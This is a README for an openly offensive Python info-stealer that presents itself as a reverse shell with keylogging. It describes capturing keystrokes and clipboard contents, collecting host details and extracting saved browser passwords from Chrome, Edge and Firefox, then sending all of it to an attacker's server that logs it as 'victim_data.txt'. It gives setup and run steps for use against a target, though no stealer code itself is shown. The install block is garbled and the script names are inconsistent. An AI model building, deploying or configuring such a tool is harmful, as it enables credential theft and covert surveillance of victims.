# simple info stealer Project

This project consists of a reverse shell implementation with keylogging capabilities. It involves two main components: a client script (`reversShell.py`) that runs on the target machine and sends data back to a server, and a server script (`server.py`) that receives and logs the data sent by the client.

## Features

1. **Socket Communication**:
   - Establishes a socket connection between the client and the server.
   - Sends data from the client to the server.

2. **Keylogging**:
   - Captures keystrokes on the client machine.
   - Sends captured keystrokes to the server.

3. **Clipboard Data**:
   - Captures clipboard data from the client machine.
   - Sends clipboard data to the server.

4. **Host Information**:
   - Gathers detailed information about the host machine, including:
     - Hostname
     - Private and public IP addresses
     - Processor information
     - Operating system details
     - Disk usage
     - Memory usage
   - Sends host information to the server.

5. **Password Stealing**:
   - Extracts saved passwords from browsers (Chrome, Edge, Firefox).
   - Sends extracted passwords to the server.

## Requirements

- Python 3.x
- Required Python libraries:
  - `pynput`
  - `requests`
  - `psutil`
  - `pywin32`

Install the required libraries using pip:

```sh
the reverseshell install the modules

## Usage

### Setting up the Server

1. **Run the server script:**

    ```bash
    python server.py
    ```

    This script starts the server, listens for incoming connections, and logs keystrokes received from clients into a file (`./victim_data.txt`).

### Running the Keylogger Client

1. **Configure the Keylogger Client:**

    Modify `client.py` with the IP address and port of your server:

    ```python
    ke = Keylogger("server_ip", 9999)  # Replace with your server's IP and port
    ```

2. **Run the keylogger client script:**

    ```bash
    python reverseShell.py
    ```

    This script connects to the specified server and starts capturing keystrokes. It also gathers browser data and system information, sending all collected data to the server for logging.

## Troubleshooting

- **File Permissions:** Ensure the server has write permissions for the `./victim_data.txt` file in the project directory.

## Acknowledgments

- Thanks to the developers of `pynput`, `socket`, `sqlite3`, `requests`, `psutil`, `platform`, `pathlib`, `shutil`, `rarfile`, and `hashlib` libraries/modules for their contributions.

---

Ensure to adjust the IP address, port number, and paths in the scripts (`reverseShell.py` and `server.py`) according to your setup. This README provides a comprehensive overview of your keylogger project, including how it captures browser data, system information, and its integration with the malware detector functionality.
